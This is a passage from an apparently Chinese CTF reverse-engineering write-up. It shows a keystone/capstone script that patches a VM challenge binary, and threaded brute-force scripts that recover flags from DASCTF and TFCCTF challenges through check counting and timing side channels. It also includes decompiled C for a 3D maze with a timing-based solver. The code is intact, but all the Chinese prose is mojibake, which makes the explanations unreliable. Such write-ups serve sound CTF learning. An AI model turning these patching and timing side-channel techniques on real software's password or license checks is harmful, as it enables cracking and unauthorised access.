<p>å¯ä»¥çœ‹åˆ°ç¨‹åºé€šè¿‡æ£€æŸ¥ç¬¬8ä¸ª(8 * 131 &#x3D; 1048)å¯„å­˜å™¨çš„å€¼æ¥åˆ¤æ–­æ˜¯å¦æ­£ç¡® è¿™æ—¶å€™å†è°ƒè¯•ä¸€é ç€é‡è§‚å¯Ÿç¬¬å…«ä¸ªå¯„å­˜å™¨ å¯ä»¥çœ‹åˆ°æ¯æ¬¡æ‰§è¡Œå®Œprocéƒ½ä¼šå¢åŠ 1~2 æœ€åæ˜¯ä¸€ä¸ªéé›¶å€¼ è¿™æ—¶å€™å°±èƒ½çŒœæµ‹åˆ°è¿™æ˜¯å‚¨å­˜ç»è¿‡å¯¹æ¯”åå’Œæ­£ç¡®æ•°æ®ä¸ç›¸ç­‰çš„æ•°æ®çš„ä¸ªæ•°çš„ è¿™æ—¶å€™å°±èƒ½å¼€å§‹å‡†å¤‡patchç¨‹åºäº† è¿™é‡Œé€‰æ‹©åœ¨æ¯ä¸ª<code>proc()</code>åçš„æŒ‡ä»¤patchä¸ºè·³è½¬åˆ°åˆ¤æ–­ç›®æ ‡å¯„å­˜å™¨çš„<code>jmp</code>æŒ‡ä»¤(å¦‚æœè¦åœ¨æ¯ä¸ªprocåç›´æ¥å¢åŠ ä¸€ä¸ªæˆ–è€…ä¿®æ”¹æˆ<code>cmp</code>çš„è¯å¯èƒ½ä¼šå› ä¸ºæŒ‡ä»¤é•¿åº¦çš„é—®é¢˜çˆ†æ®µ) è§‚å¯Ÿåˆ°æ¯æ¬¡procæŒ‡ä»¤åéƒ½ä¼šå¯¹æ¯”<code>r15</code>å¯„å­˜å™¨çš„å€¼è¿›è¡Œå¼‚å¸¸å¤„ç†:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F08%2F29%2F20240829-112123.png" alt="image-20240829112123666"></p>
<p>æ®æ­¤ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„21ä¸ª<code>cmp</code>(æœ€åä¸€ä¸ªprocä¸ç”¨è·³è½¬) patchæˆç›®æ ‡æŒ‡ä»¤:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> keystone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pe = <span class="string">&#x27;bzff\\vm.exe&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(pe, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line">    target = <span class="number">0x40B2E0</span></span><br><span class="line">    base = <span class="number">0x400c00</span></span><br><span class="line">    end = <span class="number">0x40CF45</span></span><br><span class="line">    ks = Ks(KS_ARCH_X86, KS_MODE_64)</span><br><span class="line">    cs = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line">    to_patch = []</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> cs.disasm(data[target - base: end - base], target):</span><br><span class="line">        <span class="keyword">if</span> ins.mnemonic == <span class="string">&#x27;cmp&#x27;</span> <span class="keyword">and</span> ins.op_str.startswith(<span class="string">&#x27;r15&#x27;</span>):</span><br><span class="line">            to_patch.append(ins.address)</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    to_patch = to_patch[<span class="number">8</span>:]</span><br><span class="line">    <span class="keyword">for</span> ins <span class="keyword">in</span> to_patch[::-<span class="number">1</span>]:</span><br><span class="line">        new_op = <span class="string">&#x27;jmp 0x40CE56&#x27;</span></span><br><span class="line">        new_ins, count = ks.asm(new_op, ins)</span><br><span class="line">        <span class="keyword">if</span> count != <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Failed to assemble&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data[ins - base: ins - base + <span class="built_in">len</span>(new_ins)] = new_ins</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;Patched <span class="subst">&#123;<span class="built_in">hex</span>(ins)&#125;</span>: <span class="subst">&#123;new_op&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;bzff\\vm_<span class="subst">&#123;<span class="number">21</span> - c&#125;</span>.exe&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            file.write(data)</span><br><span class="line">        c += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±è·å¾—äº†æ¯æ¬¡å¯¹æ¯”2*n(0 &lt; n &lt; 23)ä¸ªæ•°æ®çš„22ä¸ªpeæ–‡ä»¶ æ¥ä¸‹æ¥è¦åšçš„å°±æ˜¯åƒè¿™äº›peæ–‡ä»¶è¾“å…¥ æ¥ä¸‹æ¥çš„æƒ³æ³•å°±æ˜¯å°†é€šè¿‡äº†ç¬¬nè½®æ£€æµ‹çš„æ•°æ®è¾“å…¥åˆ°ç¬¬n + 1ä¸ªpeæ–‡ä»¶ä¸­è¿›è¡Œä¸‹ä¸€è½®çš„åˆ¤æ–­ ç›´åˆ°è¿›è¡Œå®Œæ‰€æœ‰çš„22è½® è¿™é‡Œçš„ç¬¬ä¸€æ­¥å¤„ç†å¯¼è‡´å®é™…ä¸Šæ¯ä¸€è½®æ£€æµ‹çš„2ä¸ªæ•°æ®å¯¹åº”çš„æ˜¯32 &#x2F; 22 â‰ˆ 1.5ä¸ªæ•°æ® è¿™æ˜¯è¿™é¢˜çš„çˆ†ç ´è§£æ³•çš„æœ€åä¸€ä¸ªéš¾ç‚¹ éœ€è¦æ‰‹åŠ¨æ§åˆ¶å·²ç¡®å®šå­—ç¬¦çš„é•¿åº¦å¹¶æ‰‹åŠ¨ä¿®æ”¹éœ€è¦è¿›è¡Œåˆ¤æ–­çš„è½®æ•°:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, threading, time, copy</span><br><span class="line"></span><br><span class="line">stdouts = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">arg, c, i</span>):</span><br><span class="line">    proc = subprocess.Popen([<span class="string">f&#x27;bzff\\vm.exe_<span class="subst">&#123;i&#125;</span>&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    stdout, stderr = proc.communicate(<span class="built_in">input</span>=arg)</span><br><span class="line">    stdouts[c] = stdout[-<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(f&#x27;[+]Testing: &#123;c&#125;&#x27;)</span></span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_thread_exit</span>(<span class="params">threads</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="keyword">not</span> thread.is_alive() <span class="keyword">for</span> thread <span class="keyword">in</span> threads):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    threads.clear()</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&#x27;DASCTF&#123;&#x27;</span>)</span><br><span class="line">flag += <span class="built_in">list</span>(<span class="string">&#x27;c669733af3ce4459b88016420b81cb15&#x27;</span>)</span><br><span class="line">flag += <span class="built_in">list</span>(<span class="string">&#x27;_&#x27;</span> * (<span class="number">39</span> - <span class="built_in">len</span>(flag)) + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line">char_table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line">offset = <span class="number">21</span></span><br><span class="line">threads = []</span><br><span class="line">pieces = []</span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> char_table:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> char_table:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_table:</span><br><span class="line">            input_content = copy.deepcopy(flag)</span><br><span class="line">            input_content[<span class="number">7</span> + <span class="number">8</span> + offset : <span class="number">7</span> + <span class="number">8</span> + offset + <span class="number">3</span>] = [a, b, c]</span><br><span class="line">            input_content = <span class="string">&#x27;&#x27;</span>.join(input_content)</span><br><span class="line">            <span class="built_in">print</span>(input_content)</span><br><span class="line">            t = threading.Thread(target=run, args=(input_content, a+b+c, offset))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(threads) == <span class="number">256</span>:</span><br><span class="line">                check_thread_exit(threads)</span><br><span class="line">                <span class="keyword">for</span> piece <span class="keyword">in</span> stdouts:</span><br><span class="line">                    <span class="keyword">if</span> stdouts[piece] == <span class="string">&#x27;!\n&#x27;</span>:</span><br><span class="line">                        pieces.append(piece)</span><br><span class="line">                stdouts.clear()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Found: <span class="subst">&#123;pieces&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>å®é™…ä¸Šå¦‚æœèƒ½æ‰¾åˆ°ä¸€ç§ç›´æ¥å¯¹è™šæ‹Ÿç©ºé—´ä¸­ç›®æ ‡å†…å­˜ç©ºé—´è¿›è¡Œèµ‹å€¼çš„apiå°±å¯ä»¥å®ç°å…¨è‡ªåŠ¨çš„çˆ†ç ´ ä¹Ÿå°±æ˜¯ä¸‹é¢ä¾§ä¿¡é“æ”»å‡»çš„æ ·å¼ è¿™é‡ŒæŒ–ä¸ªå‘</p>
<p>ä»¥ä¸Šå°±æ˜¯ä¾§ä¿¡é“æ”»å‡»æœ€åŸå§‹çš„æƒ³æ³• ä¸‹é¢è¯¦ç»†è¯´æ˜æ—¶é—´ä¾§ä¿¡é“æ”»å‡»çš„æ–¹æ³•å’Œä¾‹å­</p>
<p>ä¸Šé¢åº”è¯¥ä¹Ÿèƒ½çœ‹å‡ºæ¥ä¸»è¦æ˜¯é€šè¿‡<code>subprocess.Popen()</code>ç›´æ¥æ‰§è¡Œç¨‹åº å¦‚æœç¨‹åºé€šè¿‡å‘½ä»¤è¡Œå‚æ•°æ¥æ”¶æ•°æ®çš„è¯å°±ç›´æ¥å°†è¦æ·»åŠ çš„å‘½ä»¤è¡Œå‚æ•°æ·»åŠ åˆ°ç¬¬ä¸€ä¸ªå‚æ•°çš„åˆ—è¡¨ä¸­ å¦åˆ™å°±åƒä¸Šé¢ç”¨<code>communicate()</code>æ–¹æ³•è¿›è¡Œæ•°æ®äº¤äº’ è¦æ³¨æ„çš„æ˜¯åªèƒ½è¾“å…¥å¯ç¼–ç çš„æ•°æ®(å¯è§å­—ç¬¦) ä¸èƒ½æ˜¯å­—èŠ‚ä¸² æ—¶é—´ä¾§ä¿¡é“æ”»å‡»çš„å¦ä¸€ä¸ªæ ¸å¿ƒå°±æ˜¯æ£€æŸ¥ç¨‹åºçš„æ‰§è¡Œæ—¶é—´å¹¶å°†æ¯ä¸ªè¾“å…¥çš„æ•°æ®ä¸è¿›è¡Œè¿™ä¸ªè¾“å…¥åç¨‹åºçš„è¿è¡Œæ—¶é—´å¯¹åº”èµ·æ¥ æ‰¾åˆ°è¿è¡Œ(å­˜æ´»)æ—¶é—´æœ€é•¿çš„ä¸€ä¸ªè¾“å…¥å½“ä½œæ­£ç¡®çš„å·²ç¡®å®šå­—ç¬¦ è¿™é‡Œç”¨TFCCTF2024çš„ä¸€é“é€†å‘ä½œä¸ºä¾‹å­</p>
<h2 id="2024-TFCCTF-Functional"><a href="#2024-TFCCTF-Functional" class="headerlink" title="[2024 TFCCTF] Functional"></a>[2024 TFCCTF] Functional</h2><p>ç¨‹åºæ˜¯ç”¨Haskellç¼–è¯‘çš„ æ¯”åŠ äº†æ··æ·†è¿˜å² å‡ ä¹ä¸å¯èƒ½é™æ€åˆ†æå‡ºåŠ å¯†å’Œæ ¡éªŒ ä¸Šç½‘æ‰¾Haskellé€†å‘çš„æ–¹æ³• å‡ ä¹éƒ½æ˜¯çˆ†ç ´ å…¶ä¸­æœ‰ä¸€ç¯‡æ˜¯é€šè¿‡pintoolæ‰¾åˆ°ç¨‹åºæ‰§è¡Œè¿‡çš„æŒ‡ä»¤çš„æ¡æ•°æ¥è¿›è¡Œä¾§ä¿¡é“æ”»å‡» å…¶å®æœ¬è´¨ä¸Šå’Œå¯¹æ—¶é—´çš„ä¾§ä¿¡é“æ”»å‡»å¤§å·®ä¸å¤§ å› ä¸ºæ‰§è¡Œçš„æŒ‡ä»¤æ¡æ•°åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯ä»¥ç”¨æ‰§è¡Œçš„æ—¶é—´æ¥è¡¡é‡ è€Œæ‰§è¡Œçš„æŒ‡ä»¤è¶Šå¤š æ‰§è¡Œçš„æ—¶é—´è¶Šé•¿å°±è¯´æ˜è¶Šæœ‰å¯èƒ½æ˜¯æ­£ç¡®çš„å­—ç¬¦(å¦‚æœé”™è¯¯ä¼šç›´æ¥é€€å‡º) è¿™é“é¢˜å°±æ˜¯ä¸“é—¨ä¸ºè¿™ç§æ–¹æ³•è®¾è®¡çš„:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, threading, time</span><br><span class="line"></span><br><span class="line">times = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">arg, c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]Testing:&#x27;</span> + arg)</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    proc = subprocess.Popen([<span class="string">&#x27;./main&#x27;</span>, arg], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">    stdout, stderr = proc.communicate()</span><br><span class="line">    cost = time.time() - t1</span><br><span class="line">    times[c] = cost</span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_thread_exit</span>(<span class="params">threads</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="keyword">not</span> thread.is_alive() <span class="keyword">for</span> thread <span class="keyword">in</span> threads):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">elf = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line"><span class="comment"># times = &#123;&#125;</span></span><br><span class="line"><span class="comment"># for i in range(0x40):</span></span><br><span class="line"><span class="comment">#     input_content = i * &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#     t1 = time.time()</span></span><br><span class="line"><span class="comment">#     proc = subprocess.Popen([elf, input_content], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#     stdout, stderr = proc.communicate()</span></span><br><span class="line"><span class="comment">#     cost = time.time() - t1</span></span><br><span class="line"><span class="comment">#     times[str(i)] = cost</span></span><br><span class="line"><span class="comment"># print(times)</span></span><br><span class="line">right_len = <span class="number">28</span></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&#x27;TFCCTF&#123;&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * (right_len - <span class="number">7</span>))</span><br><span class="line">char_table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_&#123;&#125;+-!@#$%^&amp;*()&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, right_len):</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> char_table:</span><br><span class="line">        input_content = flag</span><br><span class="line">        input_content[i] = c</span><br><span class="line">        input_content = <span class="string">&#x27;&#x27;</span>.join(input_content)</span><br><span class="line">        t = threading.Thread(target=run, args=(input_content, c))</span><br><span class="line">        threads.append(t)</span><br><span class="line">        t.start()</span><br><span class="line">    check_thread_exit(threads)</span><br><span class="line">    most_likely = <span class="built_in">sorted</span>(times.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    flag[i] = most_likely</span><br><span class="line">    times.clear()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n[+]Solution found:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br></pre></td></tr></table></figure>

<p>é™¤äº†åœ¨æ™®é€šçš„åŠ å¯†-æ ¡éªŒç¨‹åºä¸­å¯ä»¥ç”¨åˆ° ä¾§ä¿¡é“è¿˜èƒ½åœ¨ç®€å•çš„æ¸¸æˆé€†å‘ä¸­å‘æŒ¥ä½œç”¨ æ¯”å¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­</p>
<h2 id="2024-DASCTFå…«æœˆå¼€å­¦å­£-maze"><a href="#2024-DASCTFå…«æœˆå¼€å­¦å­£-maze" class="headerlink" title="[2024 DASCTFå…«æœˆå¼€å­¦å­£] maze"></a>[2024 DASCTFå…«æœˆå¼€å­¦å­£] maze</h2><p>ç›´æ¥çœ‹ä¸»å‡½æ•°å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ª8 * 8 * 8çš„ä¸‰ç»´è¿·å®« æ²¡æœ‰è®¾ç½®åœ°å›¾è¾¹ç•Œ ç§»åŠ¨æ—¶åªæœ‰ç¢°åˆ°å¢™å£æ‰ä¼šåœä¸‹ è¶Šç•Œåˆ™ä¼šç›´æ¥åˆ¤å®šå¤±è´¥å¹¶ç»“æŸç¨‹åº:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> pos; <span class="comment">// [rsp+20h] [rbp-98h]</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">112</span>]; <span class="comment">// [rsp+30h] [rbp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  pos = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="number">100</span>);</span><br><span class="line">  print(<span class="string">&quot;Welcome to this sign in problem.\n&quot;</span>, argv, envp);</span><br><span class="line">  print(<span class="string">&quot;Give me your input:&quot;</span>, v3, v4);</span><br><span class="line">  print_0(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">for</span> ( step = <span class="number">0</span>; ; ++step )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( step &gt;= <span class="built_in">strlen</span>(Str) )</span><br><span class="line">      quit();</span><br><span class="line">    Sleep(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">switch</span> ( Str[step] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">7</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">8</span> - <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos - <span class="number">1</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          --pos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">7</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">8</span> + <span class="number">1</span> &gt;= <span class="number">8</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos + <span class="number">1</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++pos;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( pos - <span class="number">64</span> &lt; <span class="number">0</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos - <span class="number">64</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos -= <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">64</span> + <span class="number">8</span> &gt;= <span class="number">64</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos + <span class="number">8</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( pos + <span class="number">64</span> &gt;= <span class="number">512</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos + <span class="number">64</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = (pos &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x3F</span>;</span><br><span class="line">          <span class="keyword">if</span> ( pos % <span class="number">64</span> - <span class="number">8</span> &lt; <span class="number">0</span> )</span><br><span class="line">            quit();</span><br><span class="line">          <span class="keyword">if</span> ( (*maze)[pos - <span class="number">8</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          pos -= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        quit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( pos == <span class="number">436</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  print(<span class="string">&quot;Good job, the flag is md5_32_lower(your input)&quot;</span>, v5, v6);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä¸æƒ³ç›¯ç€è¿·å®«ç¡¬è§£çš„è¯ ä¹Ÿå¯ä»¥ç”¨æ—¶é—´ä¾§ä¿¡é“è¿›è¡Œçˆ†ç ´ åªéœ€è¦æ·»åŠ å‡ ä¸ªæ¡ä»¶ ä¾‹å¦‚ä¸èƒ½é‡å¤ä¸€ä¸ªæ­¥éª¤ ä¸èƒ½åœ¨ä¸€æ­¥åè¿›è¡Œç›¸åçš„ä¸€æ­¥:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess, threading, time, copy</span><br><span class="line"></span><br><span class="line">times = &#123;&#125;</span><br><span class="line">stdouts = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">arg, c</span>):</span><br><span class="line">    t1 = time.time()</span><br><span class="line">    proc = subprocess.Popen([<span class="string">&#x27;bzff\\Maze.exe&#x27;</span>], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="literal">True</span>)</span><br><span class="line">    stdout, stderr = proc.communicate(<span class="built_in">input</span>=arg)</span><br><span class="line">    cost = time.time() - t1</span><br><span class="line">    times[c] = cost</span><br><span class="line">    stdouts[c] = stdout[-<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> stdout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_thread_exit</span>(<span class="params">threads</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>(<span class="keyword">not</span> thread.is_alive() <span class="keyword">for</span> thread <span class="keyword">in</span> threads):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"><span class="comment"># times = &#123;&#125;</span></span><br><span class="line"><span class="comment"># for i in range(0x40):</span></span><br><span class="line"><span class="comment">#     input_content = i * &#x27;_&#x27;</span></span><br><span class="line"><span class="comment">#     t1 = time.time()</span></span><br><span class="line"><span class="comment">#     proc = subprocess.Popen([elf, input_content], stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span></span><br><span class="line"><span class="comment">#     stdout, stderr = proc.communicate()</span></span><br><span class="line"><span class="comment">#     cost = time.time() - t1</span></span><br><span class="line"><span class="comment">#     times[str(i)] = cost</span></span><br><span class="line"><span class="comment"># print(times)</span></span><br><span class="line">flag = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;d&#x27;</span>]</span><br><span class="line">oppsite = &#123;<span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;u&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[+]Now: <span class="subst">&#123;<span class="string">&quot;&quot;</span>.join(flag)&#125;</span>&#x27;</span>)</span><br><span class="line">    char_table = <span class="string">&#x27;wasdun&#x27;</span>.replace(flag[-<span class="number">1</span>], <span class="string">&#x27;&#x27;</span>).replace(oppsite[flag[-<span class="number">1</span>]], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> char_table:</span><br><span class="line">        char_table2 = char_table.replace(a, <span class="string">&#x27;&#x27;</span>).replace(oppsite[a], <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> char_table2:</span><br><span class="line">            input_content = copy.deepcopy(flag)</span><br><span class="line">            input_content += [a, c]</span><br><span class="line">            input_content = <span class="string">&#x27;&#x27;</span>.join(input_content)</span><br><span class="line">            t = threading.Thread(target=run, args=(input_content, a+c))</span><br><span class="line">            threads.append(t)</span><br><span class="line">            t.start()</span><br><span class="line">    check_thread_exit(threads)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;put)&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> [stdouts[c] <span class="keyword">for</span> c <span class="keyword">in</span> stdouts]:</span><br><span class="line">        most_likely = <span class="built_in">sorted</span>(times.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        flag += <span class="built_in">list</span>(most_likely)[<span class="number">0</span>]</span><br><span class="line">        stdouts.clear()</span><br><span class="line">        times.clear()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n[+]Solution found:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag), end=<span class="string">&#x27;\nRest in :&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(stdouts)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

